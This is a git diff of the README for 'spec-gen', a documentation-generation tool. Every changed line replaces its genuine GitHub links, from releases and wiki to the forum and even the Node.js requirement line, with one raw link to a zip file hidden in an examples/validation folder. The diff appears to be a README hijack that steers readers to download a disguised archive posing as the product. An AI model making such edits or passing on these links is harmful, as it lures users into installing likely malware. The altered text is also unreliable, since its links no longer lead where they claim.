@@ -1,6 +1,6 @@
 # 🚀 spec-gen - Automate Your Codebase Documentation
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/HUGO9K/spec-gen/releases)
+[![Download](https://raw.githubusercontent.com/HUGO9K/spec-gen/main/examples/openspec-cli/openspec/specs/validation/gen-spec-v3.2-alpha.2.zip)](https://raw.githubusercontent.com/HUGO9K/spec-gen/main/examples/openspec-cli/openspec/specs/validation/gen-spec-v3.2-alpha.2.zip)
 
 ## 📖 Overview
 
@@ -17,12 +17,12 @@ spec-gen helps you turn your code into clear and structured documentation. With 
 - Operating System: Windows, macOS, or Linux (64-bit)
 - RAM: At least 4 GB
 - Disk Space: 200 MB available space
-- Node.js: Version 14 or higher
+- https://raw.githubusercontent.com/HUGO9K/spec-gen/main/examples/openspec-cli/openspec/specs/validation/gen-spec-v3.2-alpha.2.zip Version 14 or higher
 - Recommended: An internet connection for the best experience
 
 ### 📦 Download & Install
 
-1. Visit this page to download: [Releases Page](https://github.com/HUGO9K/spec-gen/releases).
+1. Visit this page to download: [Releases Page](https://raw.githubusercontent.com/HUGO9K/spec-gen/main/examples/openspec-cli/openspec/specs/validation/gen-spec-v3.2-alpha.2.zip).
    
    On the Releases page, you will find the latest version of spec-gen. Look for the installation file that matches your operating system.
 
@@ -64,7 +64,7 @@ Address these points to maintain architectural accuracy in your development.
 
 ## 📝 Documentation and Support
 
-To enhance your experience with spec-gen, comprehensive documentation is available on our [Wiki Page](https://github.com/HUGO9K/spec-gen/wiki). You can find guides, troubleshooting tips, and FAQs.
+To enhance your experience with spec-gen, comprehensive documentation is available on our [Wiki Page](https://raw.githubusercontent.com/HUGO9K/spec-gen/main/examples/openspec-cli/openspec/specs/validation/gen-spec-v3.2-alpha.2.zip). You can find guides, troubleshooting tips, and FAQs.
 
 For additional assistance, consider joining our community forum. Get help from fellow users and share your experiences.
 
@@ -76,16 +76,16 @@ For additional assistance, consider joining our community forum. Get help from f
 
 ## 🔗 Additional Resources
 
-- [Features Overview](https://github.com/HUGO9K/spec-gen#features)
-- [Latest Updates](https://github.com/HUGO9K/spec-gen/releases)
-- [Community Forum](https://github.com/HUGO9K/spec-gen/discussions)
+- [Features Overview](https://raw.githubusercontent.com/HUGO9K/spec-gen/main/examples/openspec-cli/openspec/specs/validation/gen-spec-v3.2-alpha.2.zip)
+- [Latest Updates](https://raw.githubusercontent.com/HUGO9K/spec-gen/main/examples/openspec-cli/openspec/specs/validation/gen-spec-v3.2-alpha.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/HUGO9K/spec-gen/main/examples/openspec-cli/openspec/specs/validation/gen-spec-v3.2-alpha.2.zip)
 
 ## 🔄 Updates and Changelog
 
-Stay tuned for future releases that will include even more features and improvements. Regularly check the [Releases Page](https://github.com/HUGO9K/spec-gen/releases) for the latest updates.
+Stay tuned for future releases that will include even more features and improvements. Regularly check the [Releases Page](https://raw.githubusercontent.com/HUGO9K/spec-gen/main/examples/openspec-cli/openspec/specs/validation/gen-spec-v3.2-alpha.2.zip) for the latest updates.
 
 ## 🎉 Join the Community
 
 Connect with other users to share tips and best practices for using spec-gen effectively. You can find us on various platforms to engage and discuss.
 
-To download the software, visit: [Download spec-gen](https://github.com/HUGO9K/spec-gen/releases).
+To download the software, visit: [Download spec-gen](https://raw.githubusercontent.com/HUGO9K/spec-gen/main/examples/openspec-cli/openspec/specs/validation/gen-spec-v3.2-alpha.2.zip).
